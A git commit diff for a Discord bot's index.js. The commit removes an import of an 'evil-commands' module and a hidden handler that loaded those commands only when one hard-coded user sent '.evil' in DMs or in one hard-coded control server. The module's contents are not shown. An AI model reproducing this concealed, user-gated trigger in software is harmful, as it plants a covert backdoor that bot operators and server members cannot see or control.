0ffe7216588bbc7ca39ba271e87dbc7aae6cc696
TKTK123456 <103334266+TKTK123456@users.noreply.github.com>
2024-07-18 00:38:30 +0000

    update

--- index.js
+++ index.js
@@ -1,5 +1,4 @@
 import { Client, GatewayIntentBits, Collection, Events, Activity, SlashCommandBuilder, Partials } from 'discord.js';
-import evilCommands from './evil-commands.js';
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -9,23 +8,10 @@ const client = new Client({
     GatewayIntentBits.DirectMessages,
     GatewayIntentBits.GuildWebhooks,
   ],
-  partials: [Partials.Channel, Partials.Message],
+  partials: [Partials.Channel, Partials.Message, Partials.User],
 });
-const ep = `.`;
-const controlGuild = '1222327428366729337';
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`)
-})
-let evilCommandsLoaded = false
-client.on('messageCreate', (message) => {
-  if (evilCommandsLoaded) return
-  if (message.guild !== null&&message.guildId!=="1222327428366729337") return
-  if (message.author.id !== '1072828308376539168') return
-  if (message.content.startsWith(`${ep}evil`)) {
-  evilCommands()
-  evilCommandsLoaded = true
-  message.reply(`Evil commands loaded!`)
-  }
 })
 
 
